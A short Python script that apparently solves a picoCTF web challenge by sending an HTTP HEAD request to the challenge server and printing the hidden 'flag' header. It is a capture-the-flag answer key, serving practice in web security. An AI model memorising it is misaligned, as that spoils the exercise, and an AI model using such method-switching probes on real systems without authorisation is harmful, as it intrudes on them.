import requests
url = "http://mercury.picoctf.net:47967/index.php?"
response = requests.head(url)
print(response.headers['flag'])